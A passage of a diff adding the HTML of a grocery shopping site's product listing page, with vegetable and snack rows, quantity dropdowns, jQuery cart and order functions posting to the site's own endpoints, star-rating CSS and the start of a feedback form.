+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice266">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/b/i/bitter_gourd.jpg" width="115" height="115" alt="Bitter gourd (Karela 200 gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/bitter-gourd-200-gm.html">Bitter gourd (Karela 200 gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs35.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 283, 'http://www.citybigmart.com/index.php/','35.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice283">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/n/a/nariyal_pani.png" width="115" height="115" alt="Green coconut (Big)(Nariyal Pani)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/green-coconut-big-nariyal-pani.html">Green coconut (Big)(Nariyal Pani)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs35.00</span>
+
+	 / Nos. 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 871, 'http://www.citybigmart.com/index.php/','35.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Nos</option>
+	                  <option  value="1-Nos">1 - Nos</option>
+	                  <option  value="2-Nos">2 - Nos</option>
+	                  <option  value="3-Nos">3 - Nos</option>
+	                  <option  value="4-Nos">4 - Nos</option>
+	                  <option  value="5-Nos">5 - Nos</option>
+	                  <option  value="6-Nos">6 - Nos</option>
+	                  <option  value="7-Nos">7 - Nos</option>
+	                  <option  value="8-Nos">8 - Nos</option>
+	                  <option  value="9-Nos">9 - Nos</option>
+	                  <option  value="10-Nos">10 - Nos</option>
+					  <option  value="11-Nos">11 - Nos</option>
+					  <option  value="12-Nos">12 - Nos</option>
+					  <option  value="13-Nos">13 - Nos</option>
+					  <option  value="14-Nos">14 - Nos</option>
+					  <option  value="15-Nos">15 - Nos</option>
+					  <option  value="16-Nos">16 - Nos</option>
+					  <option  value="17-Nos">17 - Nos</option>
+					  <option  value="18-Nos">18 - Nos</option>
+					  <option  value="19-Nos">19 - Nos</option>
+					  <option  value="20-Nos">20 - Nos</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice871">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/r/a/raita_bundi.jpeg" width="115" height="115" alt="Raita Boondi (Pack Of 250gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/raita-boondi-pack-of-250gm.html">Raita Boondi (Pack Of 250gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs35.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 1040, 'http://www.citybigmart.com/index.php/','35.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1040">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/m/i/mix-namkeen.jpg" width="115" height="115" alt="  Mix Namkeen (250gm)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/mix-namkeen-250gm.html">  Mix Namkeen (250gm)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs35.00</span>
+
+	 / Pack 	</td>
+	<td style="border-bottom: 1px solid activecaption">
+		<select onchange="javascript:ajaxaddtocart(this.value, 1048, 'http://www.citybigmart.com/index.php/','35.0000');" id="QuantityId" name="QuantityId">
+                            <option selected="selected" value="0">0 - Pack</option>
+	                  <option  value="1-Pack">1 - Pack</option>
+	                  <option  value="2-Pack">2 - Pack</option>
+	                  <option  value="3-Pack">3 - Pack</option>
+	                  <option  value="4-Pack">4 - Pack</option>
+	                  <option  value="5-Pack">5 - Pack</option>
+	                  <option  value="6-Pack">6 - Pack</option>
+	                  <option  value="7-Pack">7 - Pack</option>
+	                  <option  value="8-Pack">8 - Pack</option>
+	                  <option  value="9-Pack">9 - Pack</option>
+	                  <option  value="10-Pack">10 - Pack</option>
+					  <option  value="11-Pack">11 - Pack</option>
+					  <option  value="12-Pack">12 - Pack</option>
+					  <option  value="13-Pack">13 - Pack</option>
+					  <option  value="14-Pack">14 - Pack</option>
+					  <option  value="15-Pack">15 - Pack</option>
+					  <option  value="16-Pack">16 - Pack</option>
+					  <option  value="17-Pack">17 - Pack</option>
+					  <option  value="18-Pack">18 - Pack</option>
+					  <option  value="19-Pack">19 - Pack</option>
+					  <option  value="20-Pack">20 - Pack</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice1048">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/r/a/raw_papaya.jpg" width="115" height="115" alt="Raw Papaya(kachha Papaya)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/raw-papaya-kachha.html">Raw Papaya(kachha Papaya)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs36.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 269, 'http://www.citybigmart.com/index.php/','36.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice269">0</span>
+
+
+	</td>
+	</tr>
+		<tr style="margin-top:2px">
+	<td style="border-bottom: 1px solid activecaption">
+	<div style="position: relative;">
+				<img src="http://www.citybigmart.com/media/catalog/product/cache/1/small_image/115x/9df78eab33525d08d6e5fb8d27136e95/l/a/lauki.jpg" width="115" height="115" alt="Bottle gourd(lauki)" />
+	</div>
+	</td>
+	<td style="border-bottom: 1px solid activecaption"><a href="http://www.citybigmart.com/index.php/bottel-gaurd-lauki.html">Bottle gourd(lauki)</a></td>
+	<td style="border-bottom: 1px solid activecaption"><span class="price">Rs36.00</span>
+
+	 / Kg	</td>
+	<td style="border-bottom: 1px solid activecaption">
+	
+
+					<select onchange="javascript:ajaxaddtocart(this.value, 262, 'http://www.citybigmart.com/index.php/','36.0000');" id="QuantityId" name="QuantityId">
+                      <option value="0">0 - Gm</option>
+	                  <option  value="250">250 - Gm</option>
+	                  <option  value="500">500 - Gm</option>
+	                  <option  value="750">750 - Gm</option>
+	                  <option  value="1">1 - Kg</option>
+	                  <option  value="1.25">1.25 - Kg</option>
+	                  <option  value="1.5">1.5 - Kg</option>
+	                  <option  value="1.75">1.75 - Kg</option>
+	                  <option  value="2">2 - Kg</option>
+	                  <option  value="2.25">2.25 - Kg</option>
+	                  <option  value="2.5">2.5 - Kg</option>
+	                  <option  value="2.75">2.75 - Kg</option>
+	                  <option  value="3">3 - Kg</option>
+	                  <option  value="3.25">3.25 - Kg</option>
+	                  <option  value="3.5">3.5 - Kg</option>
+	                  <option  value="3.75">3.75 - Kg</option>
+	                  <option  value="4">4 - Kg</option>
+	                  <option  value="4.25">4.25 - Kg</option>
+	                  <option  value="4.5">4.5 - Kg</option>
+	                  <option  value="4.75">4.75 - Kg</option>
+	                  <option  value="5">5 - Kg</option>
+	                  <option  value="6">6 - Kg</option>
+	                  <option  value="7">7 - Kg</option>
+	                  <option  value="8">8 - Kg</option>
+	                  <option  value="9">9 - Kg</option>
+	                  <option  value="10">10 - Kg</option>
+					  <option  value="11">11 - Kg</option>
+					  <option  value="12">12 - Kg</option>
+					  <option  value="13">13 - Kg</option>
+					  <option  value="14">14 - Kg</option>
+					  <option  value="15">15 - Kg</option>
+					  <option  value="16">16 - Kg</option>
+					  <option  value="17">17 - Kg</option>
+					  <option  value="18">18 - Kg</option>
+					  <option  value="19">19 - Kg</option>
+					  <option  value="20">20 - Kg</option>
+	        		</select>
+		</td>
+	<td style="border-bottom: 1px solid activecaption"><span class="fprice262">0</span>
+
+
+	</td>
+	</tr>
+	
+	<tfoot>
+	<td colspan="2"><a class="docklink" href="#dialog2" name="modal2" style="color: #0000FF;
+    font-size: 16px;
+    font-weight: bold;
+    text-decoration: none;">Can't Find A Product<br> Please Suggest Us!</a></td>
+	<td colspan="3"><div style="margin-right:10px;text-align:right;margin-bottom:70px">
+
+<span style="float:right; margin-right:75px; margin-bottom:5px;"><input type="button" onclick="deliverytime('0','http://www.citybigmart.com/index.php/','0')" class="placeorderbutton" name="placeorderbtn">
+</span>
+</div></td>
+	</tfoot>
+	</table>
+</div> <!-- added 31 Dec 2013 -->
+<div class="toolbar-bottom">
+       <div class="pager">
+<p class="amount"> Items 1 to 50 of 169 total</p>
+<fieldset class="limiter">Show <select
+	onchange="setLocation(this.value)">
+		<option value="http://www.citybigmart.com/index.php/?limit=50"
+	 selected="selected"
+	>50</option>
+		<option value="http://www.citybigmart.com/index.php/?limit=100"
+	>100</option>
+		<option value="http://www.citybigmart.com/index.php/?limit=150"
+	>150</option>
+		<option value="http://www.citybigmart.com/index.php/?limit=200"
+	>200</option>
+		<option value="http://www.citybigmart.com/index.php/?limit=500"
+	>500</option>
+		<option value="http://www.citybigmart.com/index.php/?limit=all"
+	>All</option>
+	</select> per page</fieldset>
+	<div class="pages"><strong>Page:</strong>
+<ol>
+				<li><a href=""><img
+		src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/pager_arrow_right.gif"
+		alt="Next" /></a></li>
+		</ol>
+</div>
+		</div>
+		<div class="sorter"><p class="view-mode"> View as:  <strong>Grid</strong>&nbsp;
+  <a href="http://www.citybigmart.com/index.php/?mode=list">List</a>&nbsp;
+  </p>
+<fieldset class="sort-by">Sort by <select
+	onchange="setLocation(this.value)">
+		<option value="http://www.citybigmart.com/index.php/?dir=asc&amp;order=position"
+	>Position</option>
+		<option value="http://www.citybigmart.com/index.php/?dir=asc&amp;order=name"
+	>Name</option>
+		<option value="http://www.citybigmart.com/index.php/?dir=asc&amp;order=price"
+	 selected="selected"
+	>Price</option>
+		<option value="http://www.citybigmart.com/index.php/?dir=asc&amp;order=sortproduct"
+	>Sort Order</option>
+	</select>  <a
+	href="http://www.citybigmart.com/index.php/?dir=desc&amp;order=price"><img
+	src="http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/sort_asc_arrow.gif"
+	alt="Set Descending Direction"
+	class="v-middle" /></a> </fieldset>
+</div>
+		</div>
+
+<script type="text/javascript">
+$j = jQuery.noConflict();
+//window.onload = updatecart('http://www.citybigmart.com/index.php/','','','');
+function updatecart(base_url, price, pid, qty)
+{
+	/*
+    * AJAX call
+    */
+    var product_id = pid; // get product id
+	var price = price; // get unit price
+	var quantity = qty;
+    $j.post(base_url+"checkout/cart/updateaddtocarajax", { pid: product_id , price: price,  qty: quantity },
+        function(data){
+            $j('#cartuppu').html(data);
+    });
+}
+
+function get_total_qty(qty, pid, base_url, price){  //alert(qty);alert(pid);return false;
+    /*
+    * AJAX call
+    */
+    var quantity = qty; // get final quantity
+    var product_id = pid; // get product id
+	var price = price; // get unit price
+    $j.post(base_url+"checkout/cart/addtocarajax", { qty: quantity, pid: product_id , price: price },
+        function(data){
+			if(isNaN(data))
+			{
+				$j('.fprice'+product_id).html(data);
+			}
+			else
+			{
+				$j('.fprice'+product_id).html(data);
+			}
+
+	    $j('#ajax-loading').hide();
+	    //window.location.assign(document.URL);
+			//updatecart(base_url, price, pid, quantity);
+    });
+
+}
+function addToCartItems()
+{
+	window.location.assign(document.URL);
+}
+function ajaxaddtocart(qty, pid, base_url, price)
+{
+	if(qty && pid){
+		if(qty == '0')
+		{
+			alert('Please select quantity');
+			return false;
+		}
+		$j('#ajax-loading').show();
+		//alert(qty);
+		get_total_qty(qty, pid, base_url, price);
+	}
+}
+
+function placeordernow(base_url, visitor_id, cartcount, cartsum )
+{
+
+	if(cartcount == 0)
+	{
+		alert('Please add items before place order.');
+		return false;
+	}
+
+	var result = confirm("Are you sure you would like to place order now?");
+	if (result==true) {
+		$j('#ajax-loading').show();
+		$j.post(base_url+"customorder/index/placeorder", { visitor_id: visitor_id},
+		function(data){
+		//$j('.delitem').html(data);
+
+		if(data == "notlogin")
+		{
+			alert('You are not logged in. Please login or register');
+			window.location.assign(base_url+"customer/account/login");
+		}
+		if(data != 'errorinorder' && data != "notlogin")
+		{
+			//$j('#ajax-loading').hide();
+
+			emptycartajax(base_url,visitor_id);
+		}
+
+
+		});
+
+	}
+
+}
+function emptycartajax(base_url, visitor_id )
+{
+	var visitor_id = visitor_id;
+	$j.post(base_url+"customorder/index/emptycartajax", { visitor_id: visitor_id},
+	function(data){
+	//$j('.delitem').html(data);
+	window.setTimeout(function() {
+	location.href = base_url;
+	}, 5000);
+	//window.location.assign(base_url);
+	});
+
+}
+function sendgift(cartcount, base_url, logornot)
+{
+
+	if(cartcount == 0)
+	{
+		reset();
+		alertify.alert("Please add items before send your gift order.");
+		return false;
+		//alert('Please add items before send your gift order.');
+		//return false;
+	}
+	else
+	{
+		if(logornot == 0)
+		{
+			reset();
+			alertify.alert("Please login before place the order.");
+			//return false;
+			//alert("Please login before place the order");
+			window.location.assign(base_url+"customer/account/login/pg/sendgift");
+		}
+		else
+		{
+			window.location.assign(base_url+"sendgift");
+		}
+
+	}
+
+
+}
+
+function deliverytime(cartcount, base_url, logornot)
+{	//alert(logornot);
+
+	if(cartcount == 0)
+	{
+		reset();
+		alertify.alert("Please add items & click on Add To Cart button before place your order.");
+		return false;
+		//alert('Please add items before place your order.');
+		//return false;
+	}
+	else
+	{
+		if(logornot == 0)
+		{
+			reset();
+			alertify.alert("Please login before place the order.");
+			//return false;
+			//alert("Please login before place the order");
+			window.location.assign(base_url+"customer/account/login/pg/deliverytime");
+		}else
+		{
+			window.location.assign(base_url+"deliverytime");
+		}
+	}
+
+
+}
+
+</script>
+
+<div class="ajax-loading" id="ajax-loading" style="display:none;"><div></div></div>
+&nbsp;
+                            <!-- end content -->
+<!--                              </div>-->
+
+            <!-- end center -->
+        </div>
+        <!-- end middle -->
+</div>
+
+
+        </div>
+  </div>
+<script type="text/javascript">
+document.observe('dom:loaded', function(){
+	var dlsuOb = new DLSU('dlscrollup',{duration: 0.5,offset:0,activeOverlay:75});
+});
+</script>
+<div id="dlscrollup" class="element-type-image" style="display: none;">
+	<a id="testlink" href="#" title="Top">
+	<img src="http://www.citybigmart.com/media/dlsu/default/navigation-up.png" alt="Top"/>	</a>
+</div><script>$_SKIN_URL = 'http://www.citybigmart.com/skin/frontend/default/default/';</script>
+<script src="" type="text/javascript"></script>
+<script src="" type="text/javascript"></script>
+<script src="http://www.citybigmart.com/js/quickContact/modalwindow.js" type="text/javascript"></script>
+<script src="http://www.citybigmart.com/js/quickContact/quickContact.js" type="text/javascript"></script>
+<style>
+#mask {
+  position:fixed;
+  left:0;
+  top:0;
+  z-index:9000;
+  background-color:#000;
+  display:none;
+}
+  
+#modalwindow .window {
+  position:absolute;
+  left:0;
+  top:0;
+  display:none;
+  z-index:9999;
+}
+
+#modalwindow .dialog_content {
+  padding:20px;
+}
+
+#modalwindow #dialog {
+  background-color: #FFF;
+  min-width:500px;
+}
+#modalwindow #dialog2 {
+  background-color: #FFF;
+  min-width:500px;
+}
+.docklink{
+  display: block;
+  height: 15px;
+  padding: 16px 43px 84px 0;
+  /*background:url('http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/btn_feedback.png') no-repeat;*/
+}
+.bo_docklink a:hover{
+ /* background:url('http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/btn_feedback_hover.png') no-repeat;*/
+  padding-right: 50px;
+}
+
+#hide {
+    display:none;
+}
+.rating
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating input:checked + span ~ span {
+    background-position:0 0;
+}
+
+/*------------------------------------------------*/	
+.rating2
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating2 input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating2 span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating2 input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating2 input:checked + span ~ span {
+    background-position:0 0;
+}
+
+/*------------------------------------------------*/	
+.rating3
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating3 input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating3 span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating3 input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating3 input:checked + span ~ span {
+    background-position:0 0;
+}
+/*------------------------------------------------*/	
+.rating4
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating4 input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating4 span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating4 input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating4 input:checked + span ~ span {
+    background-position:0 0;
+}
+/*------------------------------------------------*/	
+.rating5
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating5 input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating5 span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating5 input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating5 input:checked + span ~ span {
+    background-position:0 0;
+}
+
+/*------------------------------------------------*/	
+.rating6
+{
+	text-align:left;
+	margin-bottom:12px
+}
+.rating6 input {
+    position:absolute;
+    filter:alpha(opacity=0);
+    -moz-opacity:0;
+    -khtml-opacity:0;
+    opacity:0;
+    cursor:pointer;
+    width:17px;
+    margin-bottom:18px
+}
+ 
+.rating6 span {
+background:url('http://www.citybigmart.com/skin/frontend/default/magik_digitalstore/images/stars.png') no-repeat -22px 0;
+    width:24px;
+    height:16px;
+    line-height:16px;
+    padding:1px 22px 1px 0; /* 1px FireFox fix */
+   /* background:url(stars.png) no-repeat -22px 0;*/
+}
+ 
+/* Change span immediately following the checked radio */
+ 
+.rating6 input:checked + span {
+    background-position:-22px 0;
+}
+ 
+/* Reset all remaining stars back to default background.
+   This supersedes the above due to its ordering. */
+ 
+.rating6 input:checked + span ~ span {
+    background-position:0 0;
+}
+
+
+
+
+</style>
+<link type="text/css" href="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/css/form-contact.css" rel="stylesheet">
+
+<div style="display:none;"><img src="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/btn_feedback_hover.png"></div>
+<div style="position:fixed; left:0px; top:200px;" class="bo_docklink"><a class="docklink" href="#dialog" name="modal"></a></div>
+
+<div id="modalwindow">  
+	
+	<div id="dialog" class="window" style="z-index: 99999999;">
+						
+		<div class="form-quick-contact">
+        <div style="padding-right:30px;">
+		<div class="title" style="padding-bottom:15px;"><h1 id="quick_contact_title">Feedback Form</h1></div>
+		<form action="http://www.citybigmart.com/index.php/quickcontact/index/post/" method="post" name="contactform" id="contactform">
+				
+				<div class="text"> 
+					<div class="info-txt"> Your Name <span style="color:#ff0000;">*</span></div>
+					<div class="info-txt"> Your Email <span style="color:#ff0000;">*</span></div>
+					<div class="info-txt"> Your Phone <span style="color:#ff0000;">*</span></div>
+					<div class="info-txt"> Quality of Vag & Fruits </div>
+					<div class="info-txt"> Delivery of Order </div>
+					<div class="info-txt"> Order Packaging </div>
+					<div class="info-txt"> Freshness of Fruits </div>
+					<div class="info-txt"> Cost of Products </div>
+					<div class="info-txt"> Customer Care </div>
+				</div>
+								
+				<div class="input">
+					<input class="input-text textbox" value="" type="text" name="name" id="name"/>
+					<input class="input-text textbox" value="" type="text" name="email" id="email"/>
+					<input class="input-text textbox" type="text" name="telephone" id="telephone" value=""/>
+					<div class="rating">
+					    <input type="radio" name="rating" id="rating1" value="0" checked /><span id="hide"></span>
+					    <input type="radio" name="rating" id="rating2" value="1" onclick="getRate('rating2', 'rate_veg_quality');"/><span></span>
+					    <input type="radio" name="rating" id="rating3" value="2" onclick="getRate('rating3', 'rate_veg_quality');"/><span></span>
+					    <input type="radio" name="rating" id="rating4" value="3" onclick="getRate('rating4', 'rate_veg_quality');"/><span></span>
+					    <input type="radio" name="rating" id="rating5" value="4" onclick="getRate('rating5', 'rate_veg_quality');"/><span></span>
+					    <input type="radio" name="rating" id="rating6" value="5" onclick="getRate('rating6', 'rate_veg_quality');"/><span></span>
+					    <input type="hidden" name="rate_veg_quality" id="rate_veg_quality" value="0" />
+					</div>
+					<div class="rating2">
+					    <input type="radio" name="rating2" id="rating21" value="0" checked /><span id="hide"></span>
+					    <input type="radio" name="rating2" id="rating22" value="1" onclick="getRate('rating22', 'rate_delivery_order');"/><span></span>
+					    <input type="radio" name="rating2" id="rating23" value="2" onclick="getRate('rating23', 'rate_delivery_order');"/><span></span>
+					    <input type="radio" name="rating2" id="rating24" value="3" onclick="getRate('rating24', 'rate_delivery_order');"/><span></span>
+					    <input type="radio" name="rating2" id="rating25" value="4" onclick="getRate('rating25', 'rate_delivery_order');"/><span></span>
+					    <input type="radio" name="rating2" id="rating26" value="5" onclick="getRate('rating26', 'rate_delivery_order');"/><span></span>
+					    <input type="hidden" name="rate_delivery_order" id="rate_delivery_order" value="0" />
+					</div>
+					<div class="rating3">
+					    <input type="radio" name="rating3" id="rating31" value="0" checked /><span id="hide"></span>
